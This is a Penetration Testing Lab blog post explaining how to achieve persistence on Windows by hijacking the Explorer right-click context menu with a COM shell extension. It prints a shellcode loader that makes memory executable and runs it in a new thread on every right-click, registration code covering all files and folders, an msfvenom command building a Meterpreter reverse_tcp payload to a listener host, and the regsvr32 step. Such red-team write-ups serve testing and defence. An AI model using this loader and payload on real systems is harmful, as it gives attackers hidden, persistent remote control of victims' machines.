---
title: Persistence – Context Menu
url: https://pentestlab.blog/2023/03/13/persistence-context-menu/
source: Penetration Testing Lab
date: 2023-03-14
fetch_date: 2025-10-04T09:29:31.089811
---

# Persistence – Context Menu

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [March 13, 2023](https://pentestlab.blog/2023/03/13/persistence-context-menu/)

# Persistence – Context Menu

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[Leave a Comment on Persistence – Context Menu](https://pentestlab.blog/2023/03/13/persistence-context-menu/#respond)

Context menu provides shortcuts to the user in order to perform a number of actions. The context menu is invoked with a right mouse click and it is a very common action for every Windows user. In offensive operations this action could be weaponized for persistence by executing shellcode every time the user attempts to use the context menu.

[RistBS](https://twitter.com/RistBS) developed a proof of concept called [ContextMenuHijack](https://github.com/RistBS/ContextMenuHijack) which can leverage the context menu for persistence by registering a COM object. The “*VirtualAlloc*” function is used in order to allocate a memory region which the executed shellcode will be stored.

```
void InjectShc()
{
    DWORD dwOldProtect = 0;
    LPVOID addr = VirtualAlloc( NULL, sizeof( buf ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    memcpy( addr, buf, sizeof( buf ) );

    VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &dwOldProtect );

    ( ( void( * )() )addr )();
}
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-virtualalloc.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-virtualalloc.png)

Context Menu – VirtualAlloc

The code below is used to receive information about the component which the user is going to select and the “*CreateThread*” will create a new thread that will execute the shellcode.

```
IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID )
{
    DWORD tid = NULL;
    CreateThread( NULL, 1024 * 1024, ( LPTHREAD_START_ROUTINE )InjectShc, NULL, 0, &tid );

    if ( NULL == pDataObj ) {
                if ( pidlFolder != NULL ) {
                }
        return S_OK;
    }
        return S_OK;
}
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-initialize.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-initialize.png)

Context Menu – Initialize & CreateThread

The “*QueryInterface*” method will query an object for the set of interfaces.

```
IFACEMETHODIMP FileContextMenuExt::QueryInterface(REFIID riid, void **ppv)
{
    static const QITAB qit[] =
    {
        QITABENT( FileContextMenuExt, IContextMenu  ),
                QITABENT( FileContextMenuExt, IContextMenu2 ),
                QITABENT( FileContextMenuExt, IContextMenu3 ),
        QITABENT( FileContextMenuExt, IShellExtInit ),
        { 0 },
    };
    return QISearch( this, qit, riid, ppv );
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-queryinterface.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-queryinterface.png)

Context Menu – QueryInterface

The context menu handler will be registered as a COM object and therefore the “*RegisterInprocServer*” function is called.

```
   hr = RegisterInprocServer( szModule, CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt Class", L"Apartment" );
    if ( SUCCEEDED( hr ) ) {
        hr = RegisterShellExtContextMenuHandler( L"AllFilesystemObjects", CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt" );
    }

    return hr;
}
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-register-com.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-filecontextmenu-register-com.png)

Context Menu – RegisterInprocServer

The Metasploit framework utility “*msfvenom*” can be used to generated the shellcode that would be written in a text file.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=4444 EXITFUNC=thread -f c > pentestlab.txt
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-msfvenom.png?w=626)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-msfvenom.png)

Context Menu – msfvenom Shellcode

Once the code is compiled will generate a DLL. The utility “*regsvr32*” can register the DLL with the operating system.

```
regsvr32 ContextMenuHijack.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-register-dll.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-register-dll.png)

Context Menu – DLL Register Server

Once the user performs a right click on the windows environment over an object (file or folder) the code will executed and a communication channel will established as it can be demonstrated below.

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-meterpreter.png?w=626)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-contextmenu-meterpreter.png)

Context Menu – Meterpreter

## References

* <https://github.com/RistBS/ContextMenuHijack>
* <https://ristbs.github.io/2023/02/15/hijack-explorer-context-menu-for-persistence-and-fun.html>

### Rate this:

### Share this:

* [Click to share on X (Opens in new window)
  X](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=twitter)
* [Click to share on Facebook (Opens in new window)
  Facebook](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=facebook)
* [Click to share on LinkedIn (Opens in new window)
  LinkedIn](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=linkedin)
* [Click to share on Reddit (Opens in new window)
  Reddit](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=reddit)
* [Click to share on Mastodon (Opens in new window)
  Mastodon](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=mastodon)
* [Click to share on Tumblr (Opens in new window)
  Tumblr](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=tumblr)
* [Click to share on WhatsApp (Opens in new window)
  WhatsApp](https://pentestlab.blog/2023/03/13/persistence-context-menu/?share=jetpack-whatsapp)
* [Click to share on Telegram (Opens in new window)
  Telegram](https://pentestlab.blog/2023/03/13/persistence-context-...